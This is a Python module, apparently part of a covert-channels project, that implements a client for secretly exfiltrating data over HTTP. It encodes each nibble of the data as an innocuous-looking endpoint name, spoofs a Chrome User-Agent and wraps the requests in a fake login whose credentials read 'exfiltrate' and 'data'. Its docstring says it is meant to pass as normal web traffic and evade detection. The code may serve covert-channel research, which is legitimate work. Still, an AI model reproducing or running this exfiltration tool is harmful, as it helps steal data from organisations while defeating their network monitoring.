"""
    This module is responsible for covertly sending data over HTTP via specific endpoints. The nibbles of each byte in
    the data are encoded as endpoints. The data is sent as a series of GET requests to the server. The server can then
    decode the data by examining the endpoints that were accessed. When executed correctly, this covert channel can
    be very difficult to detect as it appears as normal web traffic.
"""

from __future__ import annotations

import requests

from covert_channels.Clients.Client import Client

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/91.0.4472.124 Safari/537.36"
}


class HttpClient(Client):
    """
        A covert channel client that covertly sends data over HTTP.
    """
    def __init__(self, target_ip: str, target_port: int):
        super().__init__(target_ip, target_port)

    def send(self, data: bytes):
        endpoint_base = f"http://{self.ip}:{self.port}/users"
        session = requests.Session()
        response = session.post(f"{endpoint_base}/login", json={"username": "exfiltrate", "password": "data"},
                                headers=HEADERS)
        print(response.json())
        for byte in data:
            upper, lower = self.__split_byte(byte)
            endpoint_node = self.__get_byte_endpoint(lower)
            response = session.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
            print(response.json())
            endpoint_node = self.__get_byte_endpoint(upper)
            response = session.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
            print(response.json())
        response = session.post(f"{endpoint_base}/logout", headers=HEADERS)
        print(response.json())

    @staticmethod
    def __split_byte(byte: int) -> tuple[int, int]:
        """
            Split a byte into the upper and lower nibbles.
        :param byte: Byte to split
        :return: A tuple containing the upper and lower nibbles
        """
        return (byte & 0xF0) >> 4, byte & 0x0F

    @staticmethod
    def __get_byte_endpoint(byte: int) -> str:
        """
            Get the endpoint for a given byte.
        :param byte: Byte to be encoded as an endpoint
        :return: The endpoint for the given byte
        """
        match byte:
            case 0x00:
                return "info"
            case 0x01:
                return "stats"
            case 0x02:
                return "home"
            case 0x03:
                return "story"
            case 0x04:
                return "privileges"
            case 0x05:
                return "profile"
            case 0x06:
                return "details"
            case 0x07:
                return "department"
            case 0x08:
                return "schedule"
            case 0x09:
                return "vacation"
            case 0x0A:
                return "group"
            case 0x0B:
                return "information"
            case 0x0C:
                return "status"
            case 0x0D:
                return "data"
            case 0x0E:
                return "reports"
            case 0x0F:
                return "messages"


if __name__ == "__main__":
    pass
